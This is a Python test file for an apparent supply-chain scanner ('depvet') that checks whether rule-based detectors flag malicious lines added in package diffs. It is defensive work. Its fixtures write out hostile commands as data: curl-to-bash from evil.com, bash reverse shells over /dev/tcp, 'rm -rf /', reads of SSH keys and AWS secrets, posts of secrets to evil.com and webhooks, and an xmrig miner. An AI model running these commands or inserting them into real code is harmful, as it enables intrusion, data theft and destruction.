"""Tests for rule-based malicious pattern detection."""

from depvet.analyzer.rules import scan_diff, is_likely_benign
from depvet.models.verdict import Severity


def make_diff(added_lines: list[str], filepath: str = "test.py") -> str:
    """Create a minimal unified diff with added lines."""
    lines = [f"--- a/{filepath}", f"+++ b/{filepath}", "@@ -1,1 +1,5 @@"]
    lines += [f"+{line}" for line in added_lines]
    return "\n".join(lines)


# ─── EXEC_BASE64 ──────────────────────────────────────────────────────────

def test_detect_exec_base64():
    diff = make_diff(["exec(base64.b64decode('aGVsbG8='))"])
    matches = scan_diff(diff, "setup.py")
    assert any(m.rule_id in ("EXEC_BASE64", "BASE64_DECODE_EXEC") for m in matches)


def test_detect_eval_base64():
    diff = make_diff(["eval(base64.b64decode(payload))"])
    matches = scan_diff(diff, "__init__.py")
    rule_ids = [m.rule_id for m in matches]
    assert "EXEC_BASE64" in rule_ids or "BASE64_DECODE_EXEC" in rule_ids


# ─── HARDCODED_IP ─────────────────────────────────────────────────────────

def test_detect_hardcoded_ip():
    diff = make_diff(['socket.connect("103.45.67.89", 8080)'])
    matches = scan_diff(diff, "utils.py")
    assert any(m.rule_id == "HARDCODED_IP" for m in matches)


# ─── ENV_EXFIL ────────────────────────────────────────────────────────────

def test_detect_aws_secret():
    diff = make_diff(["secret = os.environ.get('AWS_SECRET_ACCESS_KEY')"])
    matches = scan_diff(diff, "auth.py")
    ids = [m.rule_id for m in matches]
    assert "ENV_EXFIL" in ids or "AWS_CREDS" in ids


def test_detect_env_api_key():
    diff = make_diff(["key = os.getenv('API_KEY')"])
    matches = scan_diff(diff, "client.py")
    assert any(m.rule_id == "ENV_EXFIL" for m in matches)


# ─── SSH_KEY ──────────────────────────────────────────────────────────────

def test_detect_ssh_key_access():
    diff = make_diff(["data = open('~/.ssh/id_rsa').read()"])
    matches = scan_diff(diff, "auth.py")
    assert any(m.rule_id == "SSH_KEY_ACCESS" for m in matches)


# ─── DISCORD_WEBHOOK ──────────────────────────────────────────────────────

def test_detect_discord_webhook():
    diff = make_diff(["requests.post('https://discordapp.com/api/webhooks/123/abc', data=payload)"])
    matches = scan_diff(diff, "utils.py")
    assert any(m.rule_id == "DISCORD_WEBHOOK" for m in matches)


def test_detect_telegram_bot():
    diff = make_diff(["requests.get(f'https://api.telegram.org/bot{TOKEN}/sendMessage')"])
    matches = scan_diff(diff, "notify.py")
    assert any(m.rule_id == "TELEGRAM_BOT" for m in matches)


# ─── SUBPROCESS ──────────────────────────────────────────────────────────

def test_detect_subprocess_shell():
    diff = make_diff(["subprocess.run(['rm', '-rf', '/'], shell=True)"])
    matches = scan_diff(diff, "setup.py")
    assert any(m.rule_id == "SUBPROCESS_SHELL" for m in matches)


def test_detect_os_system():
    diff = make_diff(["os.system('curl http://evil.com/payload | bash')"])
    matches = scan_diff(diff, "setup.py")
    assert any(m.rule_id == "OS_SYSTEM" for m in matches)


# ─── CRYPTO MINER / REVERSE SHELL ─────────────────────────────────────────

def test_detect_crypto_miner():
    diff = make_diff(["bin = 'xmrig --pool stratum+tcp://pool.monero.com:3333'"])
    matches = scan_diff(diff, "init.py")
    assert any(m.rule_id == "CRYPTO_MINER" for m in matches)


def test_detect_reverse_shell():
    diff = make_diff(["os.system('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')"])
    matches = scan_diff(diff, "setup.py")
    ids = [m.rule_id for m in matches]
    assert "REVERSE_SHELL" in ids or "OS_SYSTEM" in ids


# ─── BENIGN DETECTION ─────────────────────────────────────────────────────

def test_benign_comment_only():
    diff = make_diff(["# This is a comment", "# Another comment"])
    assert is_likely_benign(diff) is True


def test_benign_version_bump():
    diff = make_diff(["__version__ = '2.0.0'", "version = '2.0.0'"])
    assert is_likely_benign(diff) is True


def test_not_benign_code_change():
    diff = make_diff(["import requests", "requests.post('http://evil.com', data=secret)"])
    assert is_likely_benign(diff) is False


def test_no_false_positive_normal_code():
    """Normal code additions should not trigger rules."""
    diff = make_diff([
        "def get_api_key(name):",
        "    return config.get(name)",
        "logger.info('Starting application')",
    ])
    matches = scan_diff(diff, "config.py")
    critical = [m for m in matches if m.severity == Severity.CRITICAL]
    assert len(critical) == 0


# ─── SEVERITY LEVELS ──────────────────────────────────────────────────────

def test_critical_severity_for_reverse_shell():
    diff = make_diff(["os.system('bash -i >& /dev/tcp/1.2.3.4/4444 0>&1')"])
    matches = scan_diff(diff)
    crits = [m for m in matches if m.severity == Severity.CRITICAL]
    assert len(crits) > 0


def test_rule_match_has_cwe():
    diff = make_diff(["exec(base64.b64decode('aGVsbG8='))"])
    matches = scan_diff(diff, "init.py")
    for m in matches:
        if m.cwe:
            assert m.cwe.startswith("CWE-")
